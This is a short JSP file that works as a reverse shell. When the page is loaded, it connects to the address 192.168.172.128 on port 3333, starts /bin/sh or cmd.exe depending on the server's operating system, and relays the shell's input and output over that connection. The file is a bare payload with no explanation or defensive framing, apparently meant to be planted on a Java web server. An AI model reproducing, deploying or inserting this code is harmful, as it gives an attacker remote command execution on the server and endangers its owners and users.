<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream mt;
    OutputStream kc;

    StreamConnector( InputStream mt, OutputStream kc )
    {
      this.mt = mt;
      this.kc = kc;
    }

    public void run()
    {
      BufferedReader tg  = null;
      BufferedWriter xdu = null;
      try
      {
        tg  = new BufferedReader( new InputStreamReader( this.mt ) );
        xdu = new BufferedWriter( new OutputStreamWriter( this.kc ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = tg.read( buffer, 0, buffer.length ) ) > 0 )
        {
          xdu.write( buffer, 0, length );
          xdu.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( tg != null )
          tg.close();
        if( xdu != null )
          xdu.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.172.128", 3333 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
